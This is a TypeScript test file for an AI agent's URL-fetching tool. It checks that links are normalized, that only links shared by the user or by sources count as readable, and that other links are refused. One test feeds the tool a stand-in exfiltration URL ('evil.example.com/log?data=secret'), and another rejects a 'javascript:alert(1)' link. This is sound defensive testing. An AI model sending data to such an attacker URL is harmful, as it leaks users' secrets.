import { describe, expect, it, vi } from 'vitest'
import { createFetchUrlTool } from '@/lib/agent/tools/fetch-url'
import { collectReadableUrls, collectUrls, normalizeUrl } from '@/lib/agent/tools/urls'
import type { ToolContext } from '@/lib/agent/types'

vi.mock('server-only', () => ({}))
vi.mock('@/lib/search/web-extract', () => ({
  hasWebExtractConfig: () => true,
  extractWebPage: vi.fn(async (url: string) => ({
    url,
    title: 'Docs',
    content: 'See [the guide](https://docs.example.com/guide) for more.',
  })),
}))

function context(readableUrls: Set<string>): ToolContext {
  let id = 0
  return {
    userId: 'user-1',
    conversationId: 'conversation-1',
    messageId: 'message-1',
    projectId: null,
    mode: 'general',
    nextSourceId: () => String(++id),
    readableUrls,
  }
}

describe('page reader links', () => {
  it('normalizes links and finds them in text and markdown', () => {
    expect(normalizeUrl('https://Example.com/a/#top')).toBe('https://example.com/a')
    expect(normalizeUrl('javascript:alert(1)')).toBeNull()
    const urls = new Set<string>()
    collectUrls(
      'Read https://a.example.com/x. Also [b](https://b.example.com/y) and https://en.wikipedia.org/wiki/Foo_(bar).',
      urls
    )
    expect([...urls].sort()).toEqual([
      'https://a.example.com/x',
      'https://b.example.com/y',
      'https://en.wikipedia.org/wiki/Foo_(bar)',
    ])
  })

  it('takes links from user messages and sources, not assistant text', () => {
    const urls = collectReadableUrls(
      [
        { role: 'user', content: 'Summarize https://user.example.com/post' },
        {
          role: 'assistant',
          content: 'Try https://assistant.example.com/made-up',
          sources: [{ url: 'https://source.example.com/page' }],
        },
      ],
      [{ url: 'https://search.example.com/result' }]
    )
    expect(urls.has('https://user.example.com/post')).toBe(true)
    expect(urls.has('https://source.example.com/page')).toBe(true)
    expect(urls.has('https://search.example.com/result')).toBe(true)
    expect(urls.has('https://assistant.example.com/made-up')).toBe(false)
  })

  it('refuses a link nobody shared and reads one the user gave', async () => {
    const readable = new Set(['https://user.example.com/post'])
    const tool = createFetchUrlTool(context(readable))

    await expect(
      tool.execute('call-1', { url: 'https://evil.example.com/log?data=secret' })
    ).rejects.toThrow('Only links the user shared')

    const result = await tool.execute('call-2', { url: 'https://user.example.com/post' })
    expect(result.details.summary).toBe('Read Docs')
    expect(readable.has('https://docs.example.com/guide')).toBe(true)
  })
})
